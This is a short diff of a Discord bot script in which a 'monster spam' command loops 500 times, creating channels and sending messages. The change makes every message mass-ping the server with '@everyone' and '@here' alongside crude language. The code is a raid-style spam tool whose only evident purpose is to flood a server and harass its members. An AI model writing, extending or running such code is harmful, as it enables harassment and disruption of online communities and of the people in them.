@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster spam')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel('@everyone hello bitches @here', 'text')
-        message.channel.send('hello bitches');
+        message.channel.send('@everyone hello bitches @here');
 }
 }
 });   
